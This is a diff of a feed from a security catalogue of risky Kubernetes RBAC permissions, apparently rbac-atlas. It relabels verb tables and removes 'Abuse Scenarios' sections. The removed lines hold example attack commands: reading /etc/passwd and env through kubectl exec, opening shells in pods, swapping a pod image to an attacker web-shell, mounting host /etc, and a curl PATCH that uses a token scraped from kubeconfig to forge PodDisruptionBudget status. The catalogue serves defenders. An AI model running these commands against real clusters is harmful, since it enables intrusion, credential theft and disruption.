- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4441,8 +4083,8 @@
  &lt;td>secrets&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4494,8 +4136,8 @@
  &lt;td>pods/attach&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4555,8 +4197,8 @@
  &lt;td>pods/exec&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4569,19 +4211,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Permits executing commands within pods in a specific namespace. This grants shell access to containers within that namespace, potentially leading to code execution, lateral movement within the namespace, and privilege escalation if sensitive workloads or service accounts are compromised.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Execute a non-interactive command inside a specific pod within the namespace.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl &lt;span class="nb">exec&lt;/span> &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; -- cat /etc/passwd
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl exec my-app-pod-xyz -n default -- env&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Obtain an interactive shell inside a specific pod within the namespace.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl &lt;span class="nb">exec&lt;/span> -it &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; -- sh
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl exec -it my-database-pod -n production -- bash&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Namespaced pod port-forward</title><link>https://rbac-atlas.github.io/rules/1005/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1005/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Permits executing commands within pods in a specific namespace. This grants shell access to containers within that namespace, potentially leading to code execution, lateral movement within the namespace, and privilege escalation if sensitive workloads or service accounts are compromised.&lt;/p></description></item><item><title>Namespaced pod port-forward</title><link>https://rbac-atlas.github.io/rules/1005/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1005/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -4620,8 +4250,8 @@
  &lt;td>pods/portforward&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4680,8 +4310,8 @@
  &lt;td>nodes/proxy&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get, create, update, patch, delete&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get] · [create] · [update] · [patch] · [delete]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4734,8 +4364,8 @@
  &lt;td>nodes/status&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>patch, update&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[patch] · [update]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4798,8 +4428,8 @@
  &lt;td>resourcequotas&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get, list, watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get, list, watch] · [list, watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4857,8 +4487,8 @@
  &lt;td>componentstatuses&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get, list&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get] · [list]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4915,8 +4545,8 @@
  &lt;td>configmaps&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get, list, watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get, list, watch] · [list, watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -4928,18 +4558,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Grants access to read all ConfigMaps across all namespaces. ConfigMaps can store non-sensitive configuration data but may sometimes inadvertently contain sensitive information, API endpoints, or settings that could be exploited, leading to information disclosure.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>List all ConfigMaps across all namespaces.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get configmaps --all-namespaces
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Retrieve a specific ConfigMap&amp;rsquo;s data.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get configmap &amp;lt;configmap-name&amp;gt; -n &amp;lt;namespace&amp;gt; -o yaml
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl get configmap kube-proxy -n kube-system -o yaml&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Read ConfigMaps in a namespace</title><link>https://rbac-atlas.github.io/rules/1023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1023/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Grants access to read all ConfigMaps across all namespaces. ConfigMaps can store non-sensitive configuration data but may sometimes inadvertently contain sensitive information, API endpoints, or settings that could be exploited, leading to information disclosure.&lt;/p></description></item><item><title>Read ConfigMaps in a namespace</title><link>https://rbac-atlas.github.io/rules/1023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1023/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -4978,8 +4597,8 @@
  &lt;td>configmaps&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get, list, watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get, list, watch] · [list, watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5042,8 +4661,8 @@
  &lt;td>csinodes&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get, list, watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get, list, watch] · [list, watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5095,8 +4714,8 @@
  &lt;td>csistoragecapacities&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get, list, watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get, list, watch] · [list, watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5147,8 +4766,8 @@
  &lt;td>events&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get, list, watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get, list, watch] · [list, watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5160,17 +4779,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Allows reading all events across all namespaces. Events can reveal sensitive operational information, error messages, pod creation/deletion activity, image names, and other details that could aid an attacker in reconnaissance or identifying vulnerabilities.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>List all events across all namespaces.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get events --all-namespaces
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Watch events in real-time across all namespaces.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get events --all-namespaces --watch
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Read LimitRanges (Namespace Information Disclosure)</title><link>https://rbac-atlas.github.io/rules/1087/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1087/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Allows reading all events across all namespaces. Events can reveal sensitive operational information, error messages, pod creation/deletion activity, image names, and other details that could aid an attacker in reconnaissance or identifying vulnerabilities.&lt;/p></description></item><item><title>Read LimitRanges (Namespace Information Disclosure)</title><link>https://rbac-atlas.github.io/rules/1087/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1087/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -5209,8 +4818,8 @@
  &lt;td>limitranges&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get, list, watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get, list, watch] · [list, watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5222,19 +4831,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Allows reading LimitRange objects within a namespace. This can reveal resource constraints for pods and containers, helping attackers understand default resource allocations and potentially tailor resource exhaustion attacks or identify tightly constrained environments.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>List all LimitRanges in a specific namespace.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get limitranges -n &amp;lt;namespace&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl get limitranges -n default&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Get the YAML definition of a specific LimitRange.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get limitrange &amp;lt;limitrange-name&amp;gt; -n &amp;lt;namespace&amp;gt; -o yaml
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl get limitrange default-limits -n default -o yaml&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Read pod logs cluster-wide</title><link>https://rbac-atlas.github.io/rules/1018/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1018/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Allows reading LimitRange objects within a namespace. This can reveal resource constraints for pods and containers, helping attackers understand default resource allocations and potentially tailor resource exhaustion attacks or identify tightly constrained environments.&lt;/p></description></item><item><title>Read pod logs cluster-wide</title><link>https://rbac-atlas.github.io/rules/1018/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1018/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -5273,8 +4870,8 @@
  &lt;td>pods/log&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5337,8 +4934,8 @@
  &lt;td>pods/log&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5401,8 +4998,8 @@
  &lt;td>clusterroles, roles, clusterrolebindings, rolebindings&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get, list, watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get, list, watch] · [list, watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5468,8 +5065,8 @@
  &lt;td>resourcequotas&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get, list, watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get, list, watch] · [list, watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5533,8 +5130,8 @@
  &lt;td>secrets&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get, list, watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get, list, watch] · [list, watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5586,8 +5183,8 @@
  &lt;td>secrets&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>get, list, watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[get, list, watch] · [list, watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5639,8 +5236,8 @@
  &lt;td>certificatesigningrequests/status&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>update, patch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[update] · [patch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5691,8 +5288,8 @@
  &lt;td>deployments/scale&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>update, patch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[update] · [patch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5744,8 +5341,8 @@
  &lt;td>networkpolicies/status&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>update, patch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[update] · [patch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5807,8 +5404,8 @@
  &lt;td>poddisruptionbudgets/status&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>create, update, patch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[create] · [update] · [patch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5820,18 +5417,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Allows creating or updating the status of PodDisruptionBudget (PDB) objects within a namespace. This could be used to misrepresent the health or disruption allowance of workloads, potentially leading to unintended disruptions or bypassing availability safeguards.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Patch a PodDisruptionBudget&amp;rsquo;s status to misrepresent its health or allowed disruptions.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Replace &amp;lt;kubernetes-api-server&amp;gt; with your API server address&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Replace &amp;lt;token&amp;gt; with your authentication token&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -k -H &lt;span class="s2">&amp;#34;Authorization: Bearer &amp;lt;token&amp;gt;&amp;#34;&lt;/span> -H &lt;span class="s2">&amp;#34;Content-Type: application/json&amp;#34;&lt;/span> -X PATCH &lt;span class="se">\
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> --data &lt;span class="s1">&amp;#39;{&amp;#34;status&amp;#34;:{&amp;#34;currentHealthy&amp;#34;:0,&amp;#34;desiredHealthy&amp;#34;:1,&amp;#34;disruptionsAllowed&amp;#34;:0,&amp;#34;expectedPods&amp;#34;:1}}&amp;#39;&lt;/span> &lt;span class="se">\
-&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> https://&amp;lt;kubernetes-api-server&amp;gt;/apis/policy/v1/namespaces/&amp;lt;namespace&amp;gt;/poddisruptionbudgets/&amp;lt;pdb-name&amp;gt;/status
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: curl -k -H &amp;#34;Authorization: Bearer $(cat ~/.kube/config | grep token: | awk &amp;#39;{print $2}&amp;#39;)&amp;#34; -H &amp;#34;Content-Type: application/json&amp;#34; -X PATCH --data &amp;#39;{&amp;#34;status&amp;#34;:{&amp;#34;currentHealthy&amp;#34;:0,&amp;#34;desiredHealthy&amp;#34;:1,&amp;#34;disruptionsAllowed&amp;#34;:0,&amp;#34;expectedPods&amp;#34;:1}}&amp;#39; https://127.0.0.1:6443/apis/policy/v1/namespaces/default/poddisruptionbudgets/my-pdb/status&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Update StatefulSet Scale (Resource Abuse/DoS)</title><link>https://rbac-atlas.github.io/rules/1097/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1097/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Allows creating or updating the status of PodDisruptionBudget (PDB) objects within a namespace. This could be used to misrepresent the health or disruption allowance of workloads, potentially leading to unintended disruptions or bypassing availability safeguards.&lt;/p></description></item><item><title>Update StatefulSet Scale (Resource Abuse/DoS)</title><link>https://rbac-atlas.github.io/rules/1097/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1097/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -5870,8 +5456,8 @@
  &lt;td>statefulsets/scale&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>update, patch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[update] · [patch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5924,8 +5510,8 @@
  &lt;td>pods&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>update, patch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[update] · [patch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5976,8 +5562,8 @@
  &lt;td>pods&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>update, patch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[update] · [patch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -5989,19 +5575,7 @@
  &lt;/tbody>
 &lt;/table>
 &lt;h2 id="description">Description&lt;/h2>
-&lt;p>Allows modifying existing pods within a specific namespace. This can be used to escalate privileges by changing a pod&amp;rsquo;s configuration to run with higher permissions, execute arbitrary code, or tamper with application behavior within that namespace.&lt;/p>
-&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
-&lt;ol>
-&lt;li>Patch a running pod in the namespace to change its container image.&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl &lt;span class="nb">set&lt;/span> image pod/&amp;lt;pod-name&amp;gt; &amp;lt;container-name&amp;gt;&lt;span class="o">=&lt;/span>&amp;lt;malicious-image&amp;gt; -n &amp;lt;namespace&amp;gt;
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl set image pod/my-web-app web=attacker/web-shell -n dev&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
-&lt;li>Patch a running pod to add a hostPath volume mount (if not blocked by PSP/PSA).&lt;/li>
-&lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl patch pod &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; --type&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;json&amp;#39;&lt;/span> -p&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;add&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/volumes/-&amp;#34;, &amp;#34;value&amp;#34;: {&amp;#34;name&amp;#34;: &amp;#34;host-path-vol&amp;#34;, &amp;#34;hostPath&amp;#34;: {&amp;#34;path&amp;#34;: &amp;#34;/etc&amp;#34;}}}, {&amp;#34;op&amp;#34;: &amp;#34;add&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/containers/0/volumeMounts/-&amp;#34;, &amp;#34;value&amp;#34;: {&amp;#34;name&amp;#34;: &amp;#34;host-path-vol&amp;#34;, &amp;#34;mountPath&amp;#34;: &amp;#34;/mnt/host-etc&amp;#34;}}]&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl patch pod my-app -n default --type=&amp;#39;json&amp;#39; -p=&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;add&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/volumes/-&amp;#34;, &amp;#34;value&amp;#34;: {&amp;#34;name&amp;#34;: &amp;#34;host-path-vol&amp;#34;, &amp;#34;hostPath&amp;#34;: {&amp;#34;path&amp;#34;: &amp;#34;/etc&amp;#34;}}}, {&amp;#34;op&amp;#34;: &amp;#34;add&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/containers/0/volumeMounts/-&amp;#34;, &amp;#34;value&amp;#34;: {&amp;#34;name&amp;#34;: &amp;#34;host-path-vol&amp;#34;, &amp;#34;mountPath&amp;#34;: &amp;#34;/mnt/host-etc&amp;#34;}}]&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Use privileged PodSecurityPolicy (deprecated)</title><link>https://rbac-atlas.github.io/rules/1078/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1078/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;p>Allows modifying existing pods within a specific namespace. This can be used to escalate privileges by changing a pod&amp;rsquo;s configuration to run with higher permissions, execute arbitrary code, or tamper with application behavior within that namespace.&lt;/p></description></item><item><title>Use privileged PodSecurityPolicy (deprecated)</title><link>https://rbac-atlas.github.io/rules/1078/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1078/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
@@ -6040,8 +5614,8 @@
  &lt;td>podsecuritypolicies&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>use&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[use]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -6093,8 +5667,8 @@
  &lt;td>*&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>watch&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[watch]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -6146,8 +5720,8 @@
  &lt;td>*&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>*&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[*]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
@@ -6200,8 +5774,8 @@
  &lt;td>*&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>Verbs&lt;/td>
- &lt;td>*&lt;/td>
+ &lt;td>Risky Verb Combinations&lt;/td>
+ &lt;td>[*]&lt;/td>
  &lt;/tr>
  &lt;tr>
  &lt;td>Tags&lt;/td>
